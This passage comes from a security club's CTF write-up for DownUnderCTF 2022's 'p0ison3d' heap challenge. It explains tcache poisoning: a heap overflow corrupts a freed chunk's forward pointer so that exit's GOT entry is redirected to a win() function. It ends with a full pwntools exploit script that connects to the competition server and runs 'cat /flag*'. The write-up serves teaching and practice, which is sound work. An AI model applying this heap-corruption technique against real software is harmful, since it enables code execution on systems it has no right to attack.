+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>delete_note</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete_note</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>The 0x90 tcache bin is now populated with the two chunks. The annotation on the right confirms that chunk C is the first entry in the tcache bin.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/poison_ss2.jpg data-srcset="/posts/down-under-ctf-2022/images/poison_ss2.jpg, images/poison_ss2.jpg 1.5x, /posts/down-under-ctf-2022/images/poison_ss2.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/poison_ss2.jpg title=Chunks></p><p>Next, the metadata of chunk B needs to be corrupted. Since we are overwriting from chunk A, we need to keep the chunk B size field the same, so we can
+overwrite it with itself. The following 8 bytes are the used as the tcachebins forward pointer, so this should be overwritten with the address of <code>exit</code> in
+the global offset table.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>edit_note</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>152</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=mh>0x91</span><span class=p>)</span> <span class=o>+</span> <span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>exit</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/svg/loading.min.svg data-src=images/poison_ss3.jpg data-srcset="/posts/down-under-ctf-2022/images/poison_ss3.jpg, images/poison_ss3.jpg 1.5x, /posts/down-under-ctf-2022/images/poison_ss3.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/poison_ss3.jpg title="Fake chunk in GOT"></p><p>As we can see, exit.got has been linked into the tcache bin&rsquo;s singly linked list. Upon allocating two more chunks, the second
+will be the fake chunk in the GOT.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_D</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_E</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span>
+</span></span></code></pre></td></tr></table></div></div><p>Exit has been overwritten with the address of the <code>win()</code> function. The program will now call <code>win()</code> when it exits.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/poison_ss4.jpg data-srcset="/posts/down-under-ctf-2022/images/poison_ss4.jpg, images/poison_ss4.jpg 1.5x, /posts/down-under-ctf-2022/images/poison_ss4.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/poison_ss4.jpg title="Overwritten Exit"></p><p>That&rsquo;s all that is needed! The flag is ours.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=images/poison_ss5.jpg data-srcset="/posts/down-under-ctf-2022/images/poison_ss5.jpg, images/poison_ss5.jpg 1.5x, /posts/down-under-ctf-2022/images/poison_ss5.jpg 2x" data-sizes=auto alt=/posts/down-under-ctf-2022/images/poison_ss5.jpg title=Flag></p><p>The final exploit is below.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./p0ison3d_patched&#34;</span><span class=p>,</span> <span class=n>checksec</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>elf</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=s2>&#34;kitty&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gs</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>continue
+</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>#context.log_level = &#34;debug&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;2022.ductf.dev&#34;</span><span class=p>,</span> <span class=mi>30024</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>create_note</span><span class=p>(</span><span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>index</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>128</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Data cannot be &gt; 128 when allocating a chunk&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;data:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>index</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>read_note</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;data:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>clean</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>data</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit_note</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>152</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Data cannot be &gt; 152 when allocating a chunk&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>exit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;data:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete_note</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;index:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>index</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=k>with</span> <span class=n>conn</span><span class=p>()</span> <span class=k>as</span> <span class=n>p</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_A</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;A&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_B</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;B&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_C</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;C&#34;</span> <span class=o>*</span> <span class=mi>120</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>delete_note</span><span class=p>(</span><span class=n>chunk_C</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>delete_note</span><span class=p>(</span><span class=n>chunk_B</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>edit_note</span><span class=p>(</span><span class=n>chunk_A</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;C&#34;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>152</span> <span class=o>-</span> <span class=mi>8</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x91</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=o>.</span><span class=n>exit</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_D</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;D&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>chunk_E</span> <span class=o>=</span> <span class=n>create_note</span><span class=p>(</span><span class=n>pack</span><span class=p>(</span><span class=n>elf</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;:</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;5&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>clean</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;cat /flag*&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Flag: </span><span class=si>{</span><span class=n>p</span><span class=o>.</span><span class=n>recvline_contains</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;DUCTF&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2> &#34;</span><span class=p>)</span> 
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2022-10-13&nbsp;<a class=git-hash href=https://github.com/Cov-ComSec/Cov-ComSec.github.io/commit/e8c10443905b96d59c7280f42423984d8a6c423e target=_blank title="commit by sharkmoos(muddy117@gmail.com) e8c10443905b96d59c7280f42423984d8a6c423e: Fixed spelling errors on _B1L4L_ work">
+<i class="fas fa-hashtag fa-fw"></i>e8c1044</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/posts/down-under-ctf-2022/index.md target=_blank>Read Markdown</a></span></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/downunderctf/>downunderctf</a>,&nbsp;<a href=/tags/ctf/>CTF</a>,&nbsp;<a href=/tags/writeup/>writeup</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/2022_log_and_path_poisoning/ class=prev rel=prev title="Log and PATH Poisoning"><i class="fas fa-angle-left fa-fw"></i>Log and PATH Poisoning</a></div></div><div id=comments><div id=utterances></div>Please ensure all comments adhere to our <strong><a href=/conduct>Code of Conduct!</a></strong><noscript>Please enable JavaScript to view the comments powered by <a href=https://utteranc.es/>Utterances</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2020 - 2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>CUEH ComSec</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i>
+</a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=/lib/lunr/lunr.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"Copy to clipboard",maxShownLines:10},comment:{utterances:{darkTheme:"photon-dark",issueTerm:"pathname",label:"Comments",lightTheme:"github-light",repo:"Cov-ComSec/Cov-ComSec.github.io"}},search:{highlightTag:"em",lunrIndexURL:"/index.json",maxResultLength:10,noResultsFound:"No results found",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
